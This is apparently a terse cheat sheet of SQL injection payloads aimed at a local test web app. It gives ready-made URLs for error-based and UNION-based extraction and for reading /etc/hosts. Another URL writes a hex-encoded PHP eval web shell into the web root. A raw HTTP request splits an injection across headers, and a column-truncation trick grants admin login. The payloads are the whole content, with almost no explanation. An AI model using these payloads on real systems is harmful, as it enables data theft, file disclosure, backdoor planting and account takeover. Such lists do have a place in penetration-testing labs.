Error-based - http://127.0.0.1:8088/user.php?username='|updatexml(0,concat(0x1,version()),2)|'&submit=

UNION based - http://127.0.0.1:8088/user.php?username='+union+select+1,user(),3,4--+f&submit=

File read - http://127.0.0.1:8088/user.php?username='+union+select+1,load_file('/etc/hosts'),3,4--+f&submit=

WebShell upload - http://127.0.0.1:8088/user.php?username='+union+select+1,0x3c3f706870206576616c28245f504f53545b315d293b203f3e,3,4+into+outfile+'/var/www/html/shell.php'--+f&submit=

Fragmented SQL-inj:

GET /userdata.php HTTP/1.1
Host: 127.0.0.1:8088
User-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
Referer: ,user())-- f
Connection: close


Column Truncation:

Register with "root      x" username and login with "root      " - you are admin now!



(SQL injection полный FAQ)[https://rdot.org/forum/showthread.php?t=124]